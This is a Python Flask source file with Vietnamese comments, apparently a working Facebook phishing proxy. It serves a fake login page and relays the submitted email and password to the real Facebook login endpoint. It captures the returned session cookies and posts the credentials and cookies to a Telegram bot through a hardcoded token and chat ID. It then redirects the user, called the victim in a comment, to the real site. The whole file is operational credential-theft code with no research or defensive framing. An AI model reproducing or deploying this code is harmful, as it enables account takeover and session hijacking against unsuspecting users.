from flask import Flask, render_template, request, redirect, make_response, session
import requests
import os
from datetime import datetime

app = Flask(__name__)
app.secret_key = os.urandom(24)

TELEGRAM_TOKEN = "8600949928:AAERwWL0-6sODzfixw--L5rNHW4hRW56HnY"
TELEGRAM_CHAT_ID = "6126534090"

def send_to_telegram(title, content):
    try:
        message = f"🔴 **{title}**\n\n{content}\n⏰ {datetime.now()}"
        requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
                      data={"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "Markdown"})
    except:
        pass

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email')
    password = request.form.get('pass')

    if not email or not password:
        return render_template('index.html', error="Vui lòng nhập đầy đủ thông tin.")

    # Forward request đến Facebook thật
    try:
        headers = {
            'User-Agent': request.headers.get('User-Agent'),
            'Accept': 'text/html,application/xhtml+xml',
            'Accept-Language': 'vi-VN,vi;q=0.9',
            'Origin': 'https://www.facebook.com',
            'Referer': 'https://www.facebook.com/'
        }

        data = {
            'email': email,
            'pass': password,
            'login': 'Đăng nhập'
        }

        # Gửi request login đến Facebook
        r = requests.post('https://www.facebook.com/login.php', data=data, headers=headers, allow_redirects=True, timeout=10)

        # Nếu Facebook redirect về trang chủ → coi như đăng nhập thành công
        if 'facebook.com' in r.url and 'home' in r.url or r.status_code == 200:
            # Lấy cookie từ response
            cookies = r.cookies.get_dict()
            
            send_to_telegram("✅ ĐĂNG NHẬP THÀNH CÔNG (PROXY)", 
                           f"Email: {email}\nPassword: {password}\n\n**Cookie thật:**\n{cookies}")

            # Redirect nạn nhân về Facebook thật
            return redirect('https://www.facebook.com')
        else:
            return render_template('index.html', error="Mật khẩu bạn nhập không đúng. Vui lòng thử lại.")

    except Exception as e:
        send_to_telegram("❌ LỖI PROXY", f"Email: {email}\nError: {str(e)}")
        return redirect('https://www.facebook.com')

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)